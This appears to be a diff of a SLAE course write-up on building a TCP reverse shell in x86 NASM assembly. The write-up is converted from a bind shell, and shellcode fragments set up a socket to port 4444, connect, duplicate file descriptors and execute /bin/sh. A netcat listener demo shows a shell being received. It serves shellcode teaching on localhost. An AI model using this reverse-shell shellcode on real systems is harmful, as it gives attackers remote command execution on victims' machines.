@@ -277,7 +277,6 @@ The value of 16 (struct sockaddr) is then pushed onto the stack, along with the 
         xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
         push edi	; push XOR'd value on the stack
         push word 0x5c11; port 4444 is set
-        ;inc ebx         ; ebx is increased with 1 from 0x1
         push word 0x2   ; AF_INET = 2
         mov ecx, esp    ; pointer to the arguments
         push 0x16	; length of sockaddr struct, 16
@@ -285,13 +284,13 @@ The value of 16 (struct sockaddr) is then pushed onto the stack, along with the 
         push edx        ; push pointer to sockfd
 ```    
     
-The next instruction set moves the hex value for the socket function into the lower half of EAX, which is required for the bind syscall:
+The next instruction set moves the hex value for the socket function into the lower half of EAX, which is required for the connect syscall:
 
 ```nasm
 	mov al, 0x66	; hex value for socket
 ```
     
-Followed by an instruction to call the interrupt to execute the bind syscall: 
+Followed by an instruction to call the interrupt to execute the connect syscall: 
 
 ```nasm
     	mov bl, 3       ; sys_bind = 3
@@ -307,7 +306,6 @@ Followed by an instruction to call the interrupt to execute the bind syscall:
         xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
         push edi	; push XOR'd value on the stack
         push word 0x5c11; port 4444 is set
-        ;inc ebx         ; ebx is increased with 1 from 0x1
         push word 0x2   ; AF_INET = 2
         mov ecx, esp    ; pointer to the arguments
         push 0x16	; length of sockaddr struct, 16
@@ -316,7 +314,6 @@ Followed by an instruction to call the interrupt to execute the bind syscall:
         mov al, 0x66    ; hex value for socket
 	mov bl, 3 	; sys_connect = 3
 	mov ecx, esp    ; pointer to the arguments
-        ;inc ebx         ; sys_connect = 3
         int 0x80        ; call the interrupt to execute the connect syscall
 ```
 
@@ -340,7 +337,7 @@ The syscall code of 0x3f is moved in the lower part of the EAX memory region.
 
 Whilst the signed flag is not set (JNS) - the counter register is decremented each time within the loop. Once the value of '-1' gets set in ECX, the signed flag will be set and the loop is broken (exits when $exc equals 0).
 
-5th syscall (Assembly code section):
+3rd syscall (Assembly code section):
 
 ```nasm
 	; 3rd syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
@@ -393,7 +390,7 @@ DESCRIPTION
            int main(int argc, char *argv[], char *envp[])
 ```
 
-This objective is achieved when a connection is made to the newly created socket port, in turn excuting an interactive shell for an attacker on the target machine.
+This objective is achieved when a reverse connection is made to the newly created socket port, in turn excuting an interactive shell for an attacker on the target machine.
 
 This instuction set will load the string '/bin/sh' onto the stack in reverse order, since the stack grows from high to low memory.
 
@@ -523,7 +520,6 @@ section .text
         xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
         push edi	; push XOR'd value on the stack
         push word 0x5c11; port 4444 is set
-        ;inc ebx         ; ebx is increased with 1 from 0x1
         push word 0x2   ; AF_INET = 2
         mov ecx, esp    ; pointer to the arguments
         push 0x16	; length of sockaddr struct, 16
@@ -532,7 +528,6 @@ section .text
         mov al, 0x66    ; hex value for socket
 	mov bl, 3 	; sys_connect = 3
 	mov ecx, esp    ; pointer to the arguments
-        ;inc ebx         ; sys_connect = 3
         int 0x80        ; call the interrupt to execute the connect syscall
 
         ; 3rd syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
@@ -580,37 +575,24 @@ echo '[+] Done!'
 The Assembly code compiled as an executable binary:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh shell_bind_tcp
+osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh reverse_shell_tcp
 [+] Assembling with Nasm ... 
 [+] Linking ...
 [+] Done!
 ```
 
-Strace is used to debug and monitor the interactions between the executable process and the Linux kernel, visually showing the system calls for the TCP bind shell:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ strace -e socket,bind,listen,accept,dup2,execve ./shell_bind_tcp
-execve("./shell_bind_tcp", ["./shell_bind_tcp"], [/* 21 vars */]) = 0
-socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
-bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 22) = 0
-listen(3, 1)                            = 0
-accept(3, 
-```
-
 The compiled ELF binary is executed:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ ./shell_bind_tcp 
+osboxes@osboxes:~/Downloads/SLAE$ ./reverse_shell_tcp 
 
 ```
 
-A separate terminal demonstrating a successful bind connection and shell on the local host (via port 4444):
+A separate terminal demonstrating a successful reverse connection and shell on the local host (via port 4444):
 
 ```bash
-osboxes@osboxes:~$ netstat -antp | grep 4444
-tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      3709/shell_bind_tcp
-osboxes@osboxes:~$ nc -nv 127.0.0.1 4444
-Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
+osboxes@osboxes:~$ nc -lv 4444
+Connection from 127.0.0.1 4444 port [tcp/*] succeeded!
 id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
